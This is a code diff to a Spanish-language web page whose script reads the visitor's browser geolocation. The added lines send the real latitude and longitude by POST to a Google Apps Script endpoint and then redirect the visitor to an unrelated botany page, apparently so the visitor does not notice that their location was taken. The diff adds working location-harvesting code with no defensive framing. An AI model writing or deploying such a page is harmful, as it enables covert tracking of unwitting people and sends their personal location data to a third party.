@@ -5,21 +5,31 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Obteniendo Ubicación...</title>
     <script>
-        function obtenerUbicacion() {
+        async function obtenerUbicacion() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    function(position) {
+                    async function(position) {
                         let lat = position.coords.latitude;
                         let lon = position.coords.longitude;
+                        console.log("Latitud:", lat);
+                        console.log("Longitud:", lon);
 
-                        // Enviar ubicación a un servidor (opcional)
-                        fetch("https://script.google.com/macros/s/AKfycbxbUQccFSD2beZZp2fHjrz1LYzp4OuMx1YM52R76FBmNGwZCuj_f2aBY0iFfAFMBOyb/exec", {
-                            method: "POST",
-                            headers: {"Content-Type": "application/json"},
-                            body: JSON.stringify({ latitud: -12.0464, longitud: -77.0428 })
-                        });
+                        try {
+                            // Enviar ubicación a Google Apps Script
+                            let respuesta = await fetch("https://script.google.com/macros/s/AKfycbw6HEcn1ON-IbGw9TZ8oNlswvaU1SNinXLXsunyVv4ZQuX-JulEoN-GZJvr86WCWtZw/exec", {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({ latitud: lat, longitud: lon })
+                            });
 
-                        // Redirigir a otra página
+                            let textoRespuesta = await respuesta.text();
+                            console.log("Respuesta del servidor:", textoRespuesta);
+
+                        } catch (error) {
+                            console.error("Error al enviar datos:", error);
+                        }
+
+                        // Redirigir después de enviar la ubicación
                         window.location.href = "https://concepto.de/botanica/"; // Cambia por tu URL destino
                     },
                     function(error) {
